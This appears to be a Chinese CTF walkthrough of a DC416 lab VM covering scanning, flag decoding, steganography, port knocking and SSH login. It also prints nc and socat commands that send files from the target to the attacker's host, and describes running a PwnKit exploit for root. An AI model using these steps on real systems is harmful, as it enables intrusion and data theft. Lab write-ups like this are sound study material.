VMware双击打开，默认nat模式即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.209)

--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.209 -p- -A

22/tcp    open  ssh      OpenSSH 5.3 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.2.15 ((CentOS))
http-robots.txt
50000/tcp open  ibm-db2?

--------------------------------------------
--------------------------------------------
3、web信息收集
访问：
http://192.168.253.209/

发现二进制：
https://www.rapidtables.org/zh-CN/convert/number/binary-to-ascii.html

-----
Welcome

This is where the adventure begins -.-

DC416 Team

btw

no flag here;(
-----

--------------------------------------------
--------------------------------------------
4、flag1

F12调试器，console有内容输出：
paratu: ob.js:1:266
synt1{z00ap4xr}

https://cryptii.com/   rot13解码！
flag1{m00nc4ke}
成功查看到flag1！

--------------------------------------------
--------------------------------------------
5、flag2

http://192.168.253.209/robots.txt
User-agent *

Disallow: /staff

http://192.168.253.209/staff
查看静态源码发现：
<a href="s.txt" style="display:none;" target="_blank"></a>
<center><img src="nsa.jpg"  border="0" ></center>

http://192.168.253.209/staff/s.txt
发现是base64码！

wget http://192.168.253.209/staff/s.txt

cat s.txt | base64 -d  > 2.txt

edward1234567890   ---edward


wget http://192.168.253.209/staff/nsa.jpg

图像隐写工具---steghide！
https://blog.csdn.net/qq_40657585/article/details/83931078


steghide extract -sf nsa.jpg
-sf <文件名> 从<文件名> 中提取数据

steghide extract -sf nsa.jpg                                                                                                                                             1 ⨯
Enter passphrase: 
wrote extracted data to "flag2".


cat flag2                                                              
flag2{M00nface}   ---获得flag信息！
/cgi-bin/vault.py?arg=message


--------------------------------------------
--------------------------------------------
6、flag3
访问：
http://192.168.253.209/cgi-bin/vault.py?arg=message
Access denied
not nsa.gov

http://192.168.253.209/nsa.gov

Referer: https://nsa.gov


--------------------------------------------
--------------------------------------------
7、flag4

dirb http://192.168.253.209/

http://192.168.253.209/admin
存在download功能，下载enc.zip

解压：
unzip enc.zip          
Archive:  enc.zip
  inflating: enc.pyc

file enc.pyc 
enc.pyc: python 2.7 byte-compiled

谷歌：python 2.7 byte-compiled解析github
https://github.com/wibiti/uncompyle2

git clone https://github.com/wibiti/uncompyle2.git
可以看到pyc文件无法直接阅读，需要用到uncompyle2进行编译py后才可以

cd uncompyle2
python2 setup.py install
uncompyle2 -h

uncompyle2 enc.pyc > enc.py

---------
cat enc.py 
#Embedded file name: ./enc.py
DESC = 'C4N YOU 1D3N71FY 7H3 FL46?'
str1 = 'FLAG4{'
str2 = '______'    ---6=F
str3 = '0'    
str4 = '_____________________'   ---21=U
str5 = '__________________'   ---18=R
str6 = '____'    ---4=D
str7 = '1'   
str8 = '_______'    ---7=G
str9 = '1'
str10 = '____________________'  ----20=T
str11 = '__________________________'   ---26=Z
str12 = '}'
+++ okay decompyling enc.pyc 
# decompiled 1 files: 1 okay, 0 failed, 0 verify failed
# 2022.04.06 01:50:22 EDT
---------
意思是下划线一横代表数量1，例如str2有六横就是数字6，然后二十六个字母表里，数字第六位就是F！

flag{f0urd1g1tz}

--------------------------------------------
--------------------------------------------
8、flag5

nc 192.168.253.209 50000

该端口有一个NSA ASCII横幅和底部更改的文本！
-----------
nc 192.168.253.209 50000


NNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS              AAA
N:::::::N       N::::::N SS:::::::::::::::S            N:::A
S::::::::N      E::::::NC:::::SUSRSI::::::S           T:::::Y
N:::::::::N     N::::::NS:::::S     SSSSSSS          A:::::::A
N::::::::::N    N::::::NS:::::S                     A:::::::::A
N:::::::::::N   N::::::NS:::::S                    A:::::A:::::A
T:::::::H::::N  R::::::O U::::SSSS                G:::::A H:::::A
N::::::N N::::N N::::::N  SS::::::SSSSS          A:::::A   A:::::A
N::::::N  N::::N:::::::N    SSS::::::::SS       A:::::A     A:::::A
N::::::N   N:::::::::::N       SSOBSC::::S     A:::::AARAIAATY:::::A
3::::::N    4::::::::::N            3:::::S   4:::::::::::::::::::::A
N::::::N     N:::::::::N            S:::::S  A:::::AAAAAAAAAAAAA:::::A
3::::::N      4::::::::NS3SSSS4     S:::::S 0:::::d             0:::::a
N::::::N       N:::::::NS::::::SUDPSS:::::SA:::::A               A:::::A
N::::::N        N::::::NS:::::::::::::::SSA:::::A                 A:::::A
NNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS AAAAAAA                   AAAAAAA


31337 7331 31338 8331 ____

-----------
注意到NSA横幅中的一些字母并不完全属于NS，大多数字母是N....S，用tr分离ns字母看看：
cat dayu | tr -d 'NSA:'

--delete 删除SET1中的字符，不翻译

---------
      ECURI           TY
                    
                         
                       
TH  RO U                G H
                 
                  
          OBC     RITY
3    4            3   4
                   
3      434      0d             0a
       UDP 
---------
ECURITY THROUGH OBCRITY 34343434 0d 0a UDP
(S)ECURITY THROUGH OB(S)C(U)RITY 34343434 0d 0a UDP
0x34  =  4
UDP端口：4444

正确顺序：
4444:udp 8331:tcp 7331:tcp 31337:tcp 31338:tcp
31337:tcp 7331:tcp 31338:tcp 8331:tcp 4444:udp

knock -v 192.168.253.211 4444:udp 8331:tcp 7331:tcp 31337:tcp 31338:tcp |  nmap 192.168.253.211 -p21 

knock -v 192.168.253.211 31337:tcp 7331:tcp 31338:tcp 8331:tcp 4444:udp | nmap 192.168.253.209 -p21 

flag5{th3fuzz}

--------------------------------------------
--------------------------------------------
9、flag6
登录ftp发现：
在第二个pcap文件中找到了第六个标志的线索，foo.pcap隔离了包含JPEG的数据流，power.jpg并将其保存为原始文件。然后用foremost提取jpeg，它给了一个发电厂的图像，左上角有一些坐标，还有一个用户名，nitro


谷歌发现：有了有关发电厂、NSA 和 Stuxnet 的线索，我们查询了谷歌，发现提到了Nitro Zeus
https://arstechnica.com/tech-policy/2016/02/massive-us-planned-cyberattack-against-iran-went-well-beyond-stuxnet/

用户名：nitro
看了这个资料才知道，密码是zeus

ssh nitro@192.168.253.210
zeus

-------
Last login: Fri Apr 28 10:04:44 2017 from 192.168.2.51

    -------------------------------------------------------------------
    XWXWXWXWXWXWXWXW                                   WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX                 A                 XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW                AWA                WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX           AA  AWXWA  AA           XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW            VWXWXWXWXWV            WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX        AA   VWXWXWXWV  AA         XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW    VWXWXWXA  VWXWXWV  AXWXWXWV    WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX     XWXWXWXWXWXWXWXWXWXWXWXWX     XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW   AXWXWXWXWXWXWXWXWXWXWXWXWXWXA   WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX      VXWXWXWXWXWXWXWXWXWXWXV      XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW         VXWXWXWXWXWXWXWXV         WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX           XWXWXWXWXWXWX           XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW         AXWXWXWXWXWXWXWXA         WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX                 I                 XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW                 I                 WXWXWXWXWXWXWXWX
    WXWXWXWXWXWXWXWX          DC416  I   DC416         XWXWXWXWXWXWXWXW
    XWXWXWXWXWXWXWXW                                   WXWXWXWXWXWXWXWX
    ------------------------------------------------------------------- 

Put the hacks aside, DC416 brings you the Tic Tac Toe!

Can you win in 3 out of 5 games?
-------
通过SSH登陆后发现又要玩游戏！
游戏要求您赢3/5游戏，很坑的是每次都是随机的！

Hooray! you win!
So far you've won 3 game(s)
You go first.
   [5/5] 

Here is your flag, you deserve it: flag6{s1xfl4gs}
总结规律，先手中间赢。


Flag: flag6{s1xfl4gs}！ 

--------------------------------------------
--------------------------------------------
10、内网信息收集
内网信息枚举：

*/15 * * * * root cd /usr/local/share/chkrootkit-0.49 && ./chkrootkit &> /dev/null

Linux version 2.6.32-696.1.1.el6.x86_64



[-] Can we read/write sensitive files:
-rw-r--r--. 1 root root 1443 4月  28 2017 /etc/passwd
-rw-r--r--. 1 root root 761 4月  28 2017 /etc/group
-rw-r--r--. 1 root root 1841 3月  21 2017 /etc/profile
----------. 1 root root 822 4月  28 2017 /etc/shadow




作者给出提示：For any issues you can shoot an email to: dolev at dc416.com or DM me @dolevfarhi

添加域名：
192.168.253.210 lancelot.dc416.com

http://lancelot.dc416.com/   ---成功访问

但是继续往下没别的信息了....

--------------------------------------------
--------------------------------------------
拓展知识：
这里发现无法进行root提权！！gcc版本也很低！

1）内部ftp枚举
那么登录下ftp看看：

ftp 127.0.0.1 21
cd pub
get bar.pcap
get foo.pcap

尝试了几种方法：有防火墙和各种命令限制
--------
nc也不行！
kali执行：
nc -l -p 8888 > foo.pcap

靶场执行:
nc 192.168.253.138 8888 < foo.pcap


项目执行：./socat -u /tmp/dayu/dayu/bar.pcap TCP4-LISTEN:21,reuseaddr
kali执行：./socat -u TCP4:192.168.253.211:55 OPEN:dayu.zip,create

socat[3344] E bind(6, {AF=2 0.0.0.0:443}, 16): Permission denied   （FW）

--------
最后用base64进行了下载！


2）流量分析   tcpflow拆开

grep flag *                                                                     2 ⨯
grep: 104.020.064.056.00080-159.203.035.128.44594：匹配到二进制文件

grep对二进制查看只需要 -a即可
grep -a flag *    ---发现flag5


获得flag5：
flag5{th3fuzz}


3）图片隐写读取

foremost流量提取图片：
foremost foo.pcap
获得图片模糊！
然后用wireshark进行打开原始数据，然后导入HxD进行编译16进制即可！



4）端口敲震代码审计

在枚举到三子棋代码发现：tictactoe.py

目录下存在：
knock.py



root提权：
PwnKit-Exploit-main-2021-4034
unzip PwnKit-Exploit-main-2021-4034
make  ---kali直接make编译c生成exploit
上传到项目环境，./exploit
成功获得root权限！


----------------------
cat /etc/knockd.conf
[options]
  UseSyslog

[opencloseSSH]
  sequence      = 2222:udp,3333:tcp,4444:udp
  seq_timeout   = 15
  tcpflags      = syn,ack
  start_command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport ssh -j ACCEPT
  cmd_timeout   = 10
  stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp --dport ssh -j ACCEPT

[openFTP]
  sequence = 31337:tcp,7331:tcp,31338:tcp,8331:tcp,4444:udp
  seq_timeout = 15
  tcpflags = syn
  start_command = /sbin/iptables -I INPUT -p tcp -s %IP% --dport 21 -j ACCEPT 
  stop_command = /sbin/iptables -D INPUT -p tcp -s %IP% --dport 21 -j ACCEPT 
----------------------


























